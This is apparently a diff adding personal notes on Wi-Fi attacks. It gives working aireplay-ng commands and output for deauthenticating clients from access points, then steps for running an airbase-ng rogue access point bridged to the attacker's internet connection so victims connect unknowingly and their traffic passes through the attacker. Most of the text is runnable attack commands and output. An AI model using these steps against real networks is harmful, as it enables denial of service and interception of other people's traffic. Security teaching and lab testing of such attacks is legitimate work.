@@ -1,0 +1,105 @@
+
+
+... the attack we are demonstrating here is de auth attack
+... which is the disconnecting the client from the ap so
+... that the client connects back with the ap again and 
+... complete the 4way handshake again.
+
+aireplay-ng --help
+
+  Aireplay-ng 1.2 beta2 - (C) 2006-2013 Thomas d'Otreppe
+  http://www.aircrack-ng.org
+  usage: aireplay-ng <options> <replay interface>
+  Filter options:
+
+      -a bssid  : set Access Point MAC address
+      -c dmac   : set Destination  MAC address
+      -h smac   : set Source       MAC address
+      -e essid  : set target AP SSID
+      --deauth      count : deauthenticate 1 or all stations (-0)
+
+ # aireplay-ng --deauth 1 -e C4:E9:84:84:25:5E wlan0mon
+16:26:02  Waiting for beacon frame (ESSID: C4:E9:84:84:25:5E) on channel -1
+16:26:02  Couldn't determine current channel for wlan0mon, you should either force th
+eoperation with --ignore-negative-one or apply a kernel patch
+Please specify a BSSID (-a).
+
+ # aireplay-ng --deauth 1 -a C4:E9:84:84:25:5E --ignore-negative-one wlan0mon 
+16:26:36  Waiting for beacon frame (BSSID: C4:E9:84:84:25:5E) on channel -1
+NB: this attack is more effective when targeting
+a connected wireless client (-c <client's mac>).
+16:26:38  Sending DeAuth to broadcast -- BSSID: [C4:E9:84:84:25:5E]
+
+ # aireplay-ng --deauth 1 -a C4:E9:84:EB:B4:60  -c 54:F2:01:41:C7:F0 --ignore-negative-one wlan0mon 
+16:28:08  Waiting for beacon frame (BSSID: C4:E9:84:EB:B4:60) on channel -1
+16:28:09  Sending 64 directed DeAuth. STMAC: [54:F2:01:41:C7:F0] [ 1|37 ACKs]
+
+... when we need to disconnect all the connected clients we weill use the -0 options
+... with the deauth options like below.
+
+aireplay-ng --deauth 0 -a C4:E9:84:EB:B4:60  -c 54:F2:01:41:C7:F0 --ignore-negative-one wlan0mon 
+16:38:12  Waiting for beacon frame (BSSID: C4:E9:84:EB:B4:60) on channel -1
+16:38:12  Sending 64 directed DeAuth. STMAC: [54:F2:01:41:C7:F0] [ 0|58 ACKs]
+16:38:13  Sending 64 directed DeAuth. STMAC: [54:F2:01:41:C7:F0] [ 0|46 ACKs]
+
+... rougue access point creation with the same name (essid) to confuse the clients
+... to connect again is another type of man-in-the-middle attack in wireless network.
+... we are using airbase-ng for that.
+
+airbase-ng --help
+
+  Airbase-ng 1.2 beta2 - (C) 2008-2013 Thomas d'Otreppe
+  Original work: Martin Beck
+  http://www.aircrack-ng.org
+
+  usage: airbase-ng <options> <replay interface>
+
+  Options:
+
+      -a bssid         : set Access Point MAC address
+      -c channel       : sets the channel the AP is running on
+      --essid ESSID    : specify a single ESSID (default: default)
+      --help           : Displays this usage screen
+
+ # airbase-ng -a aa:aa:bb:bb:cc:cc -e "Rokeya" -c 11 wlan0mon
+
+16:59:24  Created tap interface at0
+16:59:24  Trying to set MTU on at0 to 1500
+16:59:24  Trying to set MTU on wlan0mon to 1800
+16:59:24  Access Point with BSSID AA:AA:BB:BB:CC:CC started.
+Error: Got channel -1, expected a value > 0.
+
+ # airodump-ng wlan0mon
+  
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ AA:AA:BB:BB:CC:CC    0      263        0    0  11  54   OPN              Rokeya 
+
+... after creating the rougue access-point we can deauth all the associated
+... client to disconnect and connect back to our accesspoint.
+
+... another way to lure the clients to add one rougue interface created in the
+... attacker laptop. say attacker has one lan port through which he is using inter
+... net. therefore when victim connects to this rougue interface will try to use
+... interface. attacker provide his internet access so that victim never
+... notice that he is using any unsolicited network.
+
+1. create any rougue ap using any suitable name using airbase-ng command 
+2. create one bridge-interface and add interface to it.
+
+ # brctl addbr masum-wifi-bridge
+ # brctl addif masum-wifi-bridge eth0
+ # brctl addif masum-wifi-bridge at0
+
+3. bring the both interface up.
+
+ # ifconfig eth0 0.0.0.0 up
+ # ifconfig at0 0.0.0.0 up
+
+4. enable port forwarding
+
+ # echo 1 > /proc/sys/net/ipv4/ip_forward
+
+... if there is a dhcp server running in the lan or in laptop can get the ip
+... 
+
